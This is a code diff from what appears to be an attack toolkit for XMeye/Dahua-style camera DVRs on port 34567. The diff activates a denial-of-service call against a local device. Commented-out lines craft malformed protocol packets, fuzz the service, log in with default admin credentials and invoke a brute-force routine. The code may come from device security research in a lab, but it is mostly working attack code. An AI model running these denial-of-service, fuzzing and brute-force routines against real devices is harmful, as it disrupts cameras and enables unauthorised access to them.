@@ -4,16 +4,28 @@ require "socket"
 require "./magic_fuzzer"
 require "./denial_of_service"
 require "./xmfuzzer"
+ 
+# xmm = Command::OPTalk.new
+# fuzzer = XMFuzzer.new(xmm.to_s, seed: :test1234.hash.to_i32)
+# fuzzer.run!
+# sleep 1000
+# fuzzer.close
 
-xmm = Command::OPTalk.new
-fuzzer = XMFuzzer.new xmm.to_s
-fuzzer.run!
-sleep 20
-fuzzer.close
+# 1000.times do
+  #xmm = XMMessage.from_s "\xFF\u0001\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000$\xFB\x9A\u0005*\u0000\u0000\u0000\"Name\":\"OPTalk\",\"SessionID\":0x00000000\"\"\"}"
+# header = "\xFF\u0001\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\x9A\u0005*\u0000\u0000\u0000"
+# xmm = XMMessage.from_s header + "\"\"Name\":\"OPTalk\",\"SessionID\":\"0x00000000\"}"
+# pp xmm
+# socket = XMSocket.new("192.168.11.109", 34567)
+# #socket.login("admin", Dahua.digest("password"))
+# socket.send_message xmm
+# puts "SENT:"
+# reply = socket.receive_message
+# puts "GOT: #{reply.message}"
+# socket.close
+# end
 
-
-
-
+puts DenialOfService.sandbox("192.168.11.109", command: Command::OPTalk)
 
 
 
@@ -131,14 +143,6 @@ fuzzer.close
 #   end
 # end
 
-# xmm = Command::SystemInfo.new
-# pp xmm.to_s
-# socket = XMSocket.new("192.168.11.109", 34567)
-# socket.login("admin", Dahua.digest("password"))
-# socket.send_message xmm
-# puts "SENT:"
-# reply = socket.receive_message
-# puts "GOT: #{reply.message}"
 
 #Brute.run("ORsEWe7l")
 
